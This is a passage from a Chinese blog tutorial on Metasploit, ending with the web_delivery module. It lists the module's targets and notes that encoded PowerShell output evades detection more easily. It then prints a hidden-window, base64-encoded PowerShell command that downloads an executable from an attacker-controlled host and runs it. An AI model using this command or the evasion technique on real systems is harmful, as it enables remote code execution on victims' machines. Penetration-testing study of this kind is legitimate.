class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Python</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，<strong>Payload</strong>、<strong>LHOST</strong>和<strong>LPORT</strong>的设置和上文中提到的方法是一样的，然后我们可以：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/script/web_delivery) &gt; show targets</span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   <span class="number">0</span>   Python</span><br><span class="line">   <span class="number">1</span>   PHP</span><br><span class="line">   <span class="number">2</span>   PSH</span><br><span class="line">   <span class="number">3</span>   Regsvr32</span><br><span class="line">   <span class="number">4</span>   pubprn</span><br><span class="line">   <span class="number">5</span>   SyncAppvPublishingServer</span><br><span class="line">   <span class="number">6</span>   PSH (Binary)</span><br><span class="line">   <span class="number">7</span>   Linux</span><br><span class="line">   <span class="number">8</span>   Mac OS X</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，可选的语言还是很多的，我们选择只要是windows就会有的PSH，也就是powershell。</p>
+<p>注：<strong>PSH</strong>和**PSH(Binary)**的区别是生成的内容是是正常的还是二进制编码过的，后者更不容易被识别。</p>
+<p>二进制情况如下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-nop</span> <span class="literal">-w</span> <span class="keyword">hidden</span> <span class="literal">-e</span> WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB1AEEAVAA9ACIAZQBjAGgAbwAgACgAJABlAG4AdgA6AHQAZQBtAHAAKwAnAFwAcQBWAFoAWgBnAG0AOAB6AC4AZQB4AGUAJwApACIAOwAgACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADYALgAxADMAMAA6ADgAMAA4ADAALwAnACwAIAAkAHUAQQBUACkAOwAgAGkAbgB2AG8AawBlAC0AaQB0AGUAbQAgACQAdQBBAFQA</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">lhl_2507</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://lhl7.github.io/2022/03/26/Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/">https://lhl7.github.io/2022/03/26/Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/index.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/03/17/%E5%B8%B8%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E5%8F%8A%E5%85%B6%E5%8A%9F%E8%83%BD%E6%80%BB%E7%BB%93/"><img class="next-cover" src="/img/index.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">寄存器总结</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lhl_2507</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">41</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">12</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/lhl7" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">Metasploit的使用笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6%E7%9A%84%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%94%9F%E6%88%90"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 木马文件的配置与生成</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%85%8D%E7%BD%AE%E6%9C%A8%E9%A9%AC%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">一、配置木马：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">二、生成木马：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%BC%80%E5%90%AF%E7%9B%91%E5%90%AC%EF%BC%9A"><span class="toc-number">1.1.3.</span> <span class="toc-text">三、开启监听：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E9%80%9A%E8%BF%87%E6%96%87%E4%BB%B6%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%EF%BC%9A"><span class="toc-number">1.1.4.</span> <span class="toc-text">四、通过文件快速启动：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%8D%86%E7%BB%91%E3%80%81%E6%B7%B7%E6%B7%86"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 捆绑、混淆</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%8D%86%E7%BB%91"><span class="toc-number">1.2.1.</span> <span class="toc-text">一、捆绑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%B7%B7%E6%B7%86"><span class="toc-number">1.2.2.</span> <span class="toc-text">二、混淆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-meterpreter"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">1.3.1.</span> <span class="toc-text">一、文件操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C"><span class="toc-number">1.3.2.</span> <span class="toc-text">二、系统操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C"><span class="toc-number">1.3.3.</span> <span class="toc-text">三、网络操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%9A"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">端口转发：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%A8%A1%E6%8B%9F%E7%94%A8%E6%88%B7%E6%93%8D%E4%BD%9C"><span class="toc-number">1.3.4.</span> <span class="toc-text">四、模拟用户操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%8C%81%E4%B9%85%E5%8C%96%E3%80%81%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB"><span class="toc-number">1.3.5.</span> <span class="toc-text">五、持久化、进程迁移</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96%EF%BC%9A"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">持久化：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB%EF%BC%9A"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">进程迁移：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%A4%9A%E4%B8%AA%E6%9C%A8%E9%A9%AC%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 多个木马连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%85%B6%E4%BB%96%E6%A8%A1%E5%9D%97"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 其他模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-delivery%EF%BC%9A"><span class="toc-number">1.5.1.</span> <span class="toc-text">web_delivery：</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/26/Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/" title="Metasploit的使用笔记">Metasploit的使用笔记</a><time datetime="2022-03-26T08:41:48.420Z" title="Created 2022-03-26 16:41:48">2022-03-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/17/%E5%B8%B8%E7%94%A8%E5%AF%84%E5%AD%98%E5%99%A8%E5%8F%8A%E5%85%B6%E5%8A%9F%E8%83%BD%E6%80%BB%E7%BB%93/" title="寄存器总结">寄存器总结</a><time datetime="2022-03-17T08:12:41.986Z" title="Created 2022-03-17 16:12:41">2022-03-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/14/CVE-2020-16898%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" title="CVE-2020-16898漏洞分析与复现">CVE-2020-16898漏洞分析与复现</a><time datetime="2022-03-14T03:52:32.290Z" title="Created 2022-03-14 11:52:32">2022-03-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/10/CVE-2020-1350%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" title="CVE-2020-1350漏洞分析与复现">CVE-2020-1350漏洞分析与复现</a><time datetime="2022-03-10T08:59:27.183Z" title="Created 2022-03-10 16:59:27">2022-03-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/08/x64%E6%B1%87%E7%BC%96%E4%BC%A0%E5%8F%82%E8%B0%83%E7%94%A8%E8%A7%84%E5%88%99/" title="64位调用约定与函数传参">64位调用约定与函数传参</a><time datetime="2022-03-08T08:20:12.658Z" title="Created 2022-03-08 16:20:12">2022-03-08</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By lhl_2507</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
